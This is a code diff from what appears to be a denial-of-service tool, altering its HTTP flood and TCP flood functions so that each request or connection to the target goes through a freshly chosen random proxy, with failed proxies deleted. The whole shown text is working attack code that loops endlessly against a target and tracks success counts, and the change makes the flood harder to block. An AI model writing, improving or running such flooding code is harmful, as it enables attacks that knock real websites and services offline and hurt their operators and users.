@@ -91,17 +91,14 @@ def down_it_http(_ctx: Context) -> None:
     """HTTP flood method."""
     proxy = None
     while True:
-        if proxy is None:
-            proxy = random_proxy_from_context(_ctx)
-
         try:
+            proxy = random_proxy_from_context(_ctx)
             response = http_request(
                 url=_ctx.get_target_url(), proxy=proxy, http_method=_ctx.http_method)
             _ctx.Statistic.http_stats[response.status] += 1
             _ctx.Statistic.connect.success += 1
         except ProxyError:
             delete_proxy(_ctx, proxy)
-            proxy = None
         except:
             _ctx.add_error(Errors(ErrorCodes.CannotSendRequest.value, CANNOT_SEND_REQUEST_ERR_MSG))
             _ctx.Statistic.connect.failed += 1
@@ -113,9 +110,8 @@ def down_it_tcp(_ctx: Context) -> None:
     """TCP flood method."""
     proxy = None
     while True:
-        if proxy is None:
-            proxy = random_proxy_from_context(_ctx)
         try:
+            proxy = random_proxy_from_context(_ctx)
             sock = _ctx.sock_manager.create_tcp_socket(proxy)
             sock.connect((_ctx.host_ip, _ctx.port))
             _ctx.Statistic.connect.success += 1
@@ -132,6 +128,5 @@ def down_it_tcp(_ctx: Context) -> None:
                     break
         except ProxyError:
             delete_proxy(_ctx, proxy)
-            proxy = None
         except:
             _ctx.Statistic.connect.failed += 1
